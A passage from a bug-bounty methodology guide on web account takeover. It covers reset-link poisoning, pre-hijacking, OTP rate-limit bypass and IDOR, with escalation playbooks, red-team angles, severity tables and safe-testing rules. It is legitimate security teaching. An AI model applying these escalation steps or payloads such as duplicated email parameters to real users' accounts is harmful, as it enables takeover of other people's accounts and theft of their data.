> **If this → then that:** a step's decision is made **client-side** (a boolean in the response) → **flip it** to skip 2FA/verification. `email_verified` accepted on registration → mark the victim's email verified for the pre-ATO chain.

---

# Real-world ATO case studies (learn the pattern, not just the payload)

> Each of these is a *documented* class or landmark finding. Read them for the **shape** — a small primitive (a trusted header, an unverified email, a resettable counter) driven all the way to takeover. That shape is exactly what you're reproducing with your two test accounts.

### Case 1 — Password-reset poisoning via the `Host`/`X-Forwarded-Host` header (the §2 flagship)
- **What:** James Kettle's *Practical HTTP Host Header Attacks* (2013) showed that frameworks build the reset link from the request `Host` (or `X-Forwarded-Host` once middleware/proxies are involved) — so an attacker's host lands in the victim's reset email. It hit **Django**, **Gallery**, and others at the time, and the class is *still* alive (PortSwigger Academy's "Password reset poisoning via middleware" lab, and a long tail of HackerOne reports).
- **Mechanism:** link host sourced from an attacker-controlled header instead of server config → victim's real token delivered to the attacker's domain (§2.1).
- **Lesson:** the reset token can be perfectly random and single-use and *still* lose — because the failure is **where the link points**, not the token's strength. Always read the actual email and check the link's host.

### Case 2 — Pre-hijacking / pre-account-takeover (the §10 quiet money bug)
- **What:** Sudhodanan & Paverd (Microsoft), *"Pre-hijacking Attacks on Web User Accounts,"* **USENIX Security 2022** — a systematic study of **75** popular services found **35 vulnerable** to at least one of **five** pre-hijack variants (Classic-Federated Merge, Unexpired Session, Trojan Identifier, Unexpired Email-Change, Non-Verifying IdP).
- **Mechanism:** an account created *before* the victim (with the victim's email, unverified) survives until the victim's SSO login merges into it (§10.1).
- **Lesson:** takeover doesn't require an existing account — claiming an identity **ahead of time** is a whole attack family. Test every "register an email you don't own" + "SSO merge" path.

### Case 3 — Brute-forcing recovery/OTP codes by defeating the rate-limit
- **What:** Laxman Muthiyah's research on **Instagram** account recovery (2019) and later a **Microsoft** account password reset (2021) showed a 6-digit recovery code (1,000,000 values) is crackable when the rate-limit can be beaten with **massive concurrency across many source IPs** — the codes reportedly earned five-figure bounties.
- **Mechanism:** the "you only get a few tries" assumption collapses under parallel/distributed requests (the race angle, [../RaceCondition/](../RaceCondition/) §10) — the limiter counts too slowly, or per-IP, and thousands of guesses land before it engages (§7).
- **Lesson:** "there's a 5-attempt lock" is not the same as "the code is unguessable." Probe whether the limit is per-account, per-IP, resettable by re-requesting, or race-able — on **your own** account, bounded (§18).

### Case 4 — IDOR / mass-assignment on the account-update endpoint → direct ATO (the §12 everyday Critical)
- **What:** a recurring HackerOne pattern — a `PUT /api/users/{id}` or a profile-update body that accepts `email`/`role`/`isAdmin` without object-level authorization, letting account `A` change account `B`'s email (then reset) or grant itself admin.
- **Mechanism:** missing **object-level authz** on a state-changing account field (§12) — the most common *authenticated* route to ATO.
- **Lesson:** check *every* "update account" call with two accounts by swapping the id and by adding sensitive fields; a single unguarded `userId` is a Critical.

> **The through-line:** in all four, the reported finding is the **takeover**, and the "bug" (trusted header, unverified email, weak limiter, missing authz) is named only as the *mechanism*. That's exactly how you should write yours (§19).

---

# PART VIII — VALIDITY, SEVERITY & REPORTING

# 15. False positives — STOP reporting these (auto-reject)

> *In plain words — the trap that sinks beginner reports:* almost everything in this table is a **lead, not a finding**. You saw the door *look* unlocked, but you never actually walked through it. A triager rejects "the reset token appears in the response" (on your *own* reset — of course you can see your own token) or "the Host header is reflected" (reflection isn't *capture*). The fix is always the same: **finish the takeover of your second account.** Don't report "token in Referer" — report "I captured account B's token via the Referer and logged in as B, here's B's profile." The rule of thumb: if your proof doesn't end with you **inside a different account**, it's not ATO yet — keep going or don't file it.

| # | Commonly mis-reported | Why it's NOT (yet) ATO | What makes it real |
|---|---|---|---|
| 1 | **"Reset token in the response"** on **your own** reset | You're seeing your own token | The token is leaked for a **victim** (Referer/host-poison) or you reset **B**'s account |
| 2 | **Host-header reflected** in the reset link | Reflection ≠ token capture | You actually **received B's token** at your host and logged in as B |
| 3 | **No rate-limit on login** | Slow/again ≠ takeover | A **brute-forceable OTP** or a **crackable reset token** you demonstrably exploit |
| 4 | **Email change works** (on your own account) | That's expected | You changed **B**'s email (IDOR/CSRF) or bypassed re-auth to reach ATO |
| 5 | **"2FA can be brute-forced" — theoretical** | No demonstrated bypass | You show **missing rate-limit** (N wrong codes, still accepted) on your own account |
| 6 | **Session cookie not `HttpOnly`** alone | A hardening nit | A concrete session-theft → login as B |
| 7 | **Pre-ATO "possible" without the merge** | Registration of an email ≠ takeover | The victim's later SSO/login actually lands in **your** account |
| 8 | **Logout doesn't clear a client cookie** | Cosmetic | The **server session** stays valid after logout/password-change and you reuse it |

> **Golden rule:** an ATO finding ends with **"as attacker `A` (or unauthenticated), I am now inside victim `B`'s account"** — shown with two accounts you own. A leaked token, a reflected host, or a missing header is a **lead** until you complete the takeover.

---

# 16. Severity calibration (CVSS + CWE)

| Scenario | Typical | CWE |
|---|---|---|
| **0-click ATO (reset poisoning / pre-ATO / IDOR on email)** | **Critical (9–10)** | CWE-640 / CWE-639 / CWE-287 |
| **1-click ATO (reset-link/Referer leak, CSRF change-email, OAuth linking)** | **High → Critical** | CWE-640 / CWE-352 / CWE-287 |
| **2FA/MFA bypass (force-browse, response flip, OTP brute)** | **High → Critical** | CWE-287 / CWE-307 / CWE-308 |
| **Session fixation / non-invalidated session → durable ATO** | **High** | CWE-384 / CWE-613 |
| **Admin ATO (any vector)** | **Critical** | as above | 
| **Pre-account-takeover (unverified-email merge)** | **High → Critical** | CWE-287 / CWE-640 |
| **Weak/leaked reset token, not yet exploited end-to-end** | **Medium → High** | CWE-640 | 
| **Missing rate-limit with no demonstrated bypass** | **Low → Medium** | CWE-307 |

> *In plain words — how to read the table and the vector strings:* severity here tracks **how easy** the takeover is and **whose** account it takes. The two dials that push it to the top are **"needs no login"** (the attacker starts as a random internet stranger) and **"needs no victim action"** (0-click — you don't even need them to click anything). An **admin** account raises everything, because owning admin usually owns the whole app. The scary-looking `AV:N/AC:L/PR:N/…` is just the CVSS shorthand for those same ideas — decode the important letters: **AV:N** = attackable over the *network* (remote), **AC:L** = *low* effort/complexity, **PR:N** = *no privileges* needed (unauthenticated), **UI:N** = *no user interaction* (0-click), and **C:H/I:H/A:H** = *high* damage to the victim's confidentiality/integrity/availability. All-worst across the board is why an unauthenticated 0-click ATO lands at ~9.8. You don't have to memorize the letters — paste your scenario into the calculator (link below) and it builds the string for you.

**CVSS anchors:**
- Unauth 0-click ATO: `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` → **~9.8 Critical**.
- 1-click ATO (victim clicks): `…/UI:R/…` → High/Critical.
- Anchor to **CWE-640** (reset), **CWE-287** (auth/2FA), **CWE-384** (session), **CWE-639** (IDOR ATO); name the vector.

---

# 17. Impact-escalation playbooks — "you found X, now do Y"

### 17.1 You found: *the reset link reflects your `Host`/`X-Forwarded-Host`*
- **Escalate:** trigger a reset for `B`, poison the host, catch `B`'s token at your server, set `B`'s password, log in as `B` (§2). **Severity:** Critical (0-click).

### 17.2 You found: *the "forgot password" API returns the token/link*
- **Escalate:** submit the victim's email → get their token → reset → ATO for anyone (§3). **Severity:** Critical, unauth.

### 17.3 You found: *reset tokens look sequential/timestamped*
- **Escalate:** collect a series (own account), model the pattern, forge `B`'s token (§4, `poc/reset_token_analyzer.py`). **Severity:** Critical.

### 17.4 You found: *OTP verify has no rate-limit*
- **Escalate:** demonstrate N wrong codes still accepted on your own account (`poc/otp_bruteforce.py`) → OTP is brute-forceable → 2FA bypass (§7). **Severity:** High/Critical.

### 17.5 You found: *the reset accepts two emails (HPP/array/CRLF)*
- **Escalate:** `email=victim&email=attacker` → victim's token mailed to you → ATO (§5). **Severity:** Critical.

### 17.6 You found: *change-email endpoint with a `userId` (IDOR)*
- **Escalate:** as `A`, change `B`'s email, then reset to it → ATO (§12, → [../IDOR/](../IDOR/)). **Severity:** Critical.

### 17.7 You found: *you can register the victim's (unverified) email*
- **Escalate:** have `B` sign in via SSO → confirm the merge lands in your account → pre-ATO (§10, → [../OAuth/](../OAuth/)). **Severity:** High/Critical.

### 17.8 You found: *a session that survives logout / password change*
- **Escalate:** show a captured session still works after `B` "logs out" / changes password → durable ATO from any session-theft bug (§11). **Severity:** High.

---

# 18. SAFE-PoC discipline

```
DO:
  □ Use TWO accounts YOU OWN — attacker A + victim B. Every proof ends "as A (or unauth), I'm inside B's account."
  □ Prove the takeover minimally: log into B, read a B-only marker (B's email on the profile), one screenshot, then STOP.
  □ For reset/token analysis, generate tokens for YOUR OWN accounts; model the weakness; don't harvest real users' tokens.
  □ For OTP rate-limit: send a BOUNDED number of wrong codes to YOUR OWN account to show the limiter is absent, then STOP —
    do NOT actually crack a real user's code.
  □ For pre-ATO: use your own second email as the "victim"; show the merge; don't target real users.
DON'T:
  □ Take over, lock out, or read a REAL user's account. Never change a real victim's password/email.
  □ Mass-brute OTPs/reset tokens against production (that's abuse + noise). Bounded proof only.
  □ Leave B's password/email changed — restore state; note it in the report.
  □ Exfiltrate real personal data beyond the one marker needed to prove access.
```
> The single rule: **prove ATO with two accounts you control, take over `B` once with a benign marker, restore state, and stop.** You never need to touch a real user to earn a Critical.

**Remediation to include:** reset tokens = high-entropy, single-use, short-TTL, bound to the user, invalidated on use/change; build reset links from a **server-configured** host (never the request `Host`/`X-Forwarded-Host`); **rate-limit + lock** OTP/reset attempts (per-account, not resettable); require **re-authentication** for email/phone/password/2FA changes and **verify the new address** before it takes effect; notify the **old** email on change; **rotate** the session on login/privilege-change and **invalidate** on logout/password-change; enforce 2FA on **all** entry points; enforce **email verification** before account-merge/SSO-link (kills pre-ATO); object-level authz on every account-update endpoint.

---

# 19. Reporting, CWE/CVSS & de-duplication

Use `ACCOUNT_TAKEOVER_REPORT_TEMPLATE.md`. Minimum:
```
1. Title       "Account takeover of any user via <vector> on <endpoint>" (name the VECTOR + that it's full ATO)
2. Severity    CVSS 3.1 vector + score + CWE-640/287/384/639 (match the vector)
3. Asset       exact endpoint/flow + the missing control (re-auth / verification / rate-limit / token binding / host source)
4. Summary     the vector, and that it yields full takeover of another user's account
5. Steps       numbered, TWO accounts: as A (or unauth) → the primitive → logged in as B (the cross-account proof)
6. PoC         request/response pairs + the B-only marker you read after takeover (redacted); state you restored B
7. Impact      full ATO (admin?) — data, funds, identity; unauth/0-click if applicable
8. Remediation the specific control from §18
```
**De-dup:** one **flow/root-cause** = one report even if reachable multiple ways; lead with the **takeover**, list the contributing primitives. A reset-poisoning ATO and the underlying host-header reflection are **one** report (lead with ATO). Injection-driven ATOs (XSS→ATO) are usually filed under the injection bug **with ATO as the impact** — check the program's preference.

---

# 20. Automation & red-team notes

**Automation (find candidates fast, prove cross-account by hand):**
```
poc/reset_token_analyzer.py   — collect your own reset tokens, score entropy/sequential/timestamp/reuse
poc/reset_poison_probe.py     — host/X-Forwarded-Host/Referer poisoning + email HPP/CRLF on the reset flow
poc/otp_bruteforce.py         — detect a missing/resettable OTP rate-limit on YOUR OWN account (bounded)
Burp (Intruder/Turbo)         — bounded OTP/rate-limit tests; two-account Autorize-style authz diff for IDOR ATO
```
- **Quality gate:** never submit "reset token in Referer" or "no rate-limit" alone. Complete the **takeover of your second account** and show the B-only marker.

**Red-team angles:**
```
□ Pre-ATO on high-value targets: pre-register their corporate email before they onboard to a SaaS → silent access on their SSO.
□ Reset-poisoning at scale via a mass "forgot password" + host injection → harvest tokens (authorized only).
□ 2FA bypass on the API/mobile path where the web enforces it → quiet ATO.
□ Session non-invalidation → a single stolen session (phish/XSS) becomes permanent access.
□ Admin ATO via an IDOR on the admin user-management endpoint → full app compromise.
□ Chain: cache deception (../WebCache/) or CORS (../CORS/) to lift a token → ATO without any credential.
```

---

# Appendix A — Workflow cheat sheet

```
┌──────────────────────────────────────────────────────────────────────────┐
│                        ACCOUNT TAKEOVER (ATO)                              │
├──────────────────────────────────────────────────────────────────────────┤
│ 0. MAP: login·register·reset·email/phone-change·2FA/OTP·SSO·session §1     │
│    (register TWO own accounts: attacker A + victim B)                       │
│ 1. RESET ⭐: host/Referer poison §2 · token leak §3 · weak/reuse token §4  │
│    · email HPP/array/CRLF/normalize §5                                      │
│ 2. 2FA/OTP ⭐: force-browse skip · response flip §6 · no-rate-limit brute   │
│    · reuse/null/leak §7 · delivery-to-attacker §8                           │
│ 3. EMAIL/PRE-ATO ⭐: change w/o reauth §9 · pre-register victim→SSO merge §10│
│ 4. SESSION: fixation · no-rotate · no-invalidate · JWT(→../JWT/) §11        │
│ 5. AUTHZ+CHAINS: IDOR on email/pass(→../IDOR/) · mass-assign §12 ·          │
│    XSS/CSRF/CORS/cache/SSRF/JNDI/SQLi/OAuth → ATO §13                       │
│ 6. LOGIC: response boolean flip · force-browse · HPP · replay §14           │
│ 7. VALIDATE→REPORT: "I'm inside B" proof, FP filter §15 · CVSS+CWE §16 ·    │
│    SAFE-PoC: TWO OWN accounts, restore B, STOP §18 · dedup §19              │
└──────────────────────────────────────────────────────────────────────────┘
```

---

# Appendix B — Decision tree

```
Pick the weakest of: who-you-are (login/2FA) · how-you-recover (reset/email) · how-session-persists (token).
│
├─ RESET flow → does the link use MY Host/X-Forwarded-Host? → poison → catch B's token → ATO. CRITICAL ⭐ §2
│     ├─ token in the response/Referer? → leak → ATO §3
│     ├─ token sequential/timestamp/reusable/not-bound? → forge/replay → ATO §4
│     └─ accepts 2 emails (HPP/array/CRLF) or a reset_url field? → mail to me → ATO §5
│
├─ 2FA/OTP → session issued before 2FA / verify is a client boolean? → force-browse / flip → bypass §6
│     ├─ no/resettable rate-limit on OTP? → brute → bypass §7 (poc/otp_bruteforce.py)
│     └─ OTP reused/leaked/null-accepted, or delivery changeable to me? → bypass §7-§8
│
├─ EMAIL/REGISTER → change email w/o reauth/verify? → set to mine → reset → ATO §9
│     └─ register the VICTIM's unverified email → their SSO merges into MY account → PRE-ATO §10 ⭐
│
├─ SESSION → id not rotated on login? → FIXATION §11 ; survives logout/pw-change? → durable ATO
│
├─ AUTHZ → IDOR/mass-assign on change-email/password with a userId? → change B's creds → ATO. CRITICAL §12
│
└─ CHAIN → have XSS/CSRF/CORS/cache/SSRF/JNDI/SQLi/OAuth? → cash out as ATO §13.

ALWAYS: two own accounts · end "I'm inside B" · benign marker · restore B's state · CWE-640/287/384/639 §16.
```

---

# Appendix C — References & further reading

**Core methodology**
- PortSwigger — Authentication vulnerabilities (+ 2FA, password reset, brute-force labs): https://portswigger.net/web-security/authentication
- OWASP WSTG — Authentication, Session Management & Identity testing: https://owasp.org/www-project-web-security-testing-guide/
- OWASP — Forgot Password & Authentication cheat sheets: https://cheatsheetseries.owasp.org/
- HackTricks — Reset/2FA/registration bypasses: https://book.hacktricks.xyz/pentesting-web/reset-password
- The Hacker Recipes — Web / accounts: https://www.thehacker.recipes/
- PentesterLab — authentication & session badges: https://pentesterlab.com/

**ATO technique writeups**
- Password-reset poisoning (PortSwigger research) + host-header attacks: https://portswigger.net/web-security/host-header
- Pre-account-takeover / account pre-hijacking research — **Avinash Sudhodanan & Andrew Paverd (Microsoft), "Pre-hijacking Attacks on Web User Accounts" (USENIX Security 2022)** — unverified-email SSO merge.
- 2FA/OTP bypass compilations (bug-bounty writeups, HackerOne disclosed reports).

**Related kits (the underlying bug classes)**
- [../OAuth/](../OAuth/) · [../JWT/](../JWT/) · [../IDOR/](../IDOR/) · [../HostHeader/](../HostHeader/) · [../CSRF/](../CSRF/) · [../XSS/](../XSS/) · [../CORS/](../CORS/) · [../WebCache/](../WebCache/) · [../RaceCondition/](../RaceCondition/) · [../SQLi/](../SQLi/) · [../NoSQLi/](../NoSQLi/)

**Standards**
- **CWE-640** (Weak Password Recovery) · **CWE-287** (Improper Authentication) · **CWE-384** (Session Fixation) · **CWE-620** (Unverified Password Change) · **CWE-307** (Excessive Auth Attempts) · **CWE-639** (Authorization Bypass via User Key) · **CWE-613** (Insufficient Session Expiration).
- **CVSS 3.1** calculator (unauth ATO ≈ 9.8): https://www.first.org/cvss/calculator/3.1

---

## Companion files
- **[ACCOUNT_TAKEOVER_ARSENAL.md](ACCOUNT_TAKEOVER_ARSENAL.md)** — reset/2FA/email/session payloads + header tricks + tools.
- **[ACCOUNT_TAKEOVER_CHECKLIST.md](ACCOUNT_TAKEOVER_CHECKLIST.md)** — phase-by-phase per flow + auto-reject.
- **[ACCOUNT_TAKEOVER_REPORT_TEMPLATE.md](ACCOUNT_TAKEOVER_REPORT_TEMPLATE.md)** — the "I'm inside B" report skeleton.
- **[AccountTakeover_Zero_to_Expert.md](AccountTakeover_Zero_to_Expert.md)** — 100-question study + field reference.
- **[poc/](poc/)** — `reset_token_analyzer.py` (token entropy/pattern) · `reset_poison_probe.py` (host/Referer poison + email HPP) · `otp_bruteforce.py` (missing-rate-limit detector, bounded, own-account).

> **Final reminder — the one rule that pays:** ATO is proven only when you end up **inside another account** — "as attacker `A` (or unauthenticated), I took over victim `B`." Break the weakest of login / recovery / session for *someone else's* account, prove it with **two accounts you own** and a benign marker, restore state, and report the **takeover** — not the leaked token or the missing header that got you there.
